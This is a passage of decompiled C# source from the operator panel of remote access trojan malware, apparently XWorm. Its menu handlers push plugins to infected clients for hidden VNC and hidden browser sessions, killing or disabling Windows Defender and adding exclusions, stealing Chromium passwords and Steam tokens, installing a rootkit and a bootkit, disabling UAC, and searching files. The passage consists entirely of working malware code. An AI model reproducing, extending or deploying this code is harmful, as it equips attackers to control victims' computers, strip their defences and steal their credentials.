					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\HVNC.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R880-136 CS$<>8__locals1 = new Main._Closure$__R880-136(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600049C RID: 1180 RVA: 0x00029BEC File Offset: 0x00027DEC
		private void MemoryToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\HVNCMemory.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R881-138 CS$<>8__locals1 = new Main._Closure$__R881-138(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600049D RID: 1181 RVA: 0x00029CDC File Offset: 0x00027EDC
		private void BotkillerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"RunBotKiller"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R882-140 CS$<>8__locals1 = new Main._Closure$__R882-140(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("Botkiller..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600049E RID: 1182 RVA: 0x00029E00 File Offset: 0x00028000
		private void WDKillerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"WDKiller"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R883-142 CS$<>8__locals1 = new Main._Closure$__R883-142(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("WDKiller..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600049F RID: 1183 RVA: 0x00029F24 File Offset: 0x00028124
		private void WDDisableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"WDDisable"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R884-144 CS$<>8__locals1 = new Main._Closure$__R884-144(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("WDDisable..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004A0 RID: 1184 RVA: 0x0002A048 File Offset: 0x00028248
		private void WDExclusionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"WDExclusion"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R885-146 CS$<>8__locals1 = new Main._Closure$__R885-146(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("WDExclusion..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004A1 RID: 1185 RVA: 0x0002A16C File Offset: 0x0002836C
		private void Form1_Activated(object sender, EventArgs e)
		{
			bool flag = Main.trans;
			if (flag)
			{
				base.Opacity = 1.0;
			}
		}

		// Token: 0x060004A2 RID: 1186 RVA: 0x0002A193 File Offset: 0x00028393
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.99;
		}

		// Token: 0x060004A3 RID: 1187 RVA: 0x0002A1A8 File Offset: 0x000283A8
		private void WDExclusionToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv3.Items.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.Lv3.Items)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						bool flag2 = Operators.CompareString(listViewItem.Text, "WDExclusion", false) == 0;
						if (flag2)
						{
							return;
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			ListViewItem listViewItem2 = new ListViewItem();
			listViewItem2.Text = "WDExclusion";
			listViewItem2.SubItems.Add("0");
			listViewItem2.ToolTipText = Guid.NewGuid().ToString();
			this.Lv3.Items.Add(listViewItem2);
			this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Helper.SB(string.Concat(new string[]
			{
				"plugin",
				SettingsHelper.SPL,
				Helper.GetChecksum("Plugins\\Options.dll"),
				SettingsHelper.SPL,
				"WDExclusion"
			}));
			this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
		}

		// Token: 0x060004A4 RID: 1188 RVA: 0x0002A2F8 File Offset: 0x000284F8
		private void UninstallPluginsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("RemovePlugins");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R889-148 CS$<>8__locals1 = new Main._Closure$__R889-148(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x060004A5 RID: 1189 RVA: 0x0002A3A4 File Offset: 0x000285A4
		private void RunRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\WindowsUpdate.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(6)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R890-150 CS$<>8__locals1 = new Main._Closure$__R890-150(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("RunUpdatedRecovery..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004A6 RID: 1190 RVA: 0x0002A4CC File Offset: 0x000286CC
		private void RunRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Lv3.Items.Count > 0;
				if (flag)
				{
					try
					{
						foreach (object obj in this.Lv3.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							bool flag2 = Operators.CompareString(listViewItem.Text, "RunRecovery", false) == 0;
							if (flag2)
							{
								return;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				ListViewItem listViewItem2 = new ListViewItem();
				listViewItem2.Text = "RunRecovery";
				listViewItem2.SubItems.Add("0");
				listViewItem2.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem2);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				byte[] msgPack = Helper.SB(string.Concat(new string[]
				{
					"plugin",
					SettingsHelper.SPL,
					Helper.GetChecksum("Plugins\\WindowsUpdate.dll"),
					SettingsHelper.SPL,
					Conversions.ToString(6)
				}));
				this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060004A7 RID: 1191 RVA: 0x00003234 File Offset: 0x00001434
		private void HiddenVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060004A8 RID: 1192 RVA: 0x0002A664 File Offset: 0x00028864
		private void HiddenAppsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\HiddenApps.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R893-152 CS$<>8__locals1 = new Main._Closure$__R893-152(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004A9 RID: 1193 RVA: 0x0002A754 File Offset: 0x00028954
		private void HiddenBrowserToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\HBrowser.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R894-154 CS$<>8__locals1 = new Main._Closure$__R894-154(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004AA RID: 1194 RVA: 0x0002A844 File Offset: 0x00028A44
		private void ChromiumToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Chromium.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R895-156 CS$<>8__locals1 = new Main._Closure$__R895-156(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("Chromium Passwords..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004AB RID: 1195 RVA: 0x0002A94C File Offset: 0x00028B4C
		private void ChromiumToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Lv3.Items.Count > 0;
				if (flag)
				{
					try
					{
						foreach (object obj in this.Lv3.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							bool flag2 = Operators.CompareString(listViewItem.Text, "Chromium", false) == 0;
							if (flag2)
							{
								return;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				ListViewItem listViewItem2 = new ListViewItem();
				listViewItem2.Text = "Chromium";
				listViewItem2.SubItems.Add("0");
				listViewItem2.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem2);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				byte[] msgPack = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Chromium.dll"));
				this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060004AC RID: 1196 RVA: 0x0002AAC4 File Offset: 0x00028CC4
		private void FilesSearcherToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\FilesSearcher.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R897-158 CS$<>8__locals1 = new Main._Closure$__R897-158(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x0002ABB4 File Offset: 0x00028DB4
		private void VoiceChatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\VoiceChat.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R898-160 CS$<>8__locals1 = new Main._Closure$__R898-160(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004AE RID: 1198 RVA: 0x0002ACA4 File Offset: 0x00028EA4
		private void RootkitToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Rootkit.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(8)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R899-162 CS$<>8__locals1 = new Main._Closure$__R899-162(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("RootKit..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004AF RID: 1199 RVA: 0x0002ADCC File Offset: 0x00028FCC
		private void ResetSurvivalToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\ResetSurvival.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(9)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R900-164 CS$<>8__locals1 = new Main._Closure$__R900-164(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("BootKit..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004B0 RID: 1200 RVA: 0x0002AEF4 File Offset: 0x000290F4
		private void SteamTokenRecoveryToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\SteamTokenRecovery.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(10)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R901-166 CS$<>8__locals1 = new Main._Closure$__R901-166(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("SteamToken..", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004B1 RID: 1201 RVA: 0x0002B01C File Offset: 0x0002921C
		private void V20RecoveryToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\V20Recovery.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(7)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R902-168 CS$<>8__locals1 = new Main._Closure$__R902-168(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("V20 Recovery", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004B2 RID: 1202 RVA: 0x0002B144 File Offset: 0x00029344
		private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\DisableUAC.dll"),
						SettingsHelper.SPL,
						Conversions.ToString(11)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R903-170 CS$<>8__locals1 = new Main._Closure$__R903-170(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					Helper.LVLog("Disable UAC", Color.Black);
					this.ShowLog();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060004B3 RID: 1203 RVA: 0x00003234 File Offset: 0x00001434
		private void Guna2ContextMenuStrip5_Opening(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x040001D9 RID: 473
		public Server S;

		// Token: 0x040001DA RID: 474
		private List<XWormTask> getTasks;

		// Token: 0x040001DB RID: 475
		public static List<BridgeEndPoint> list_4;

		// Token: 0x040001DC RID: 476
		public static bool trans;
	}
}
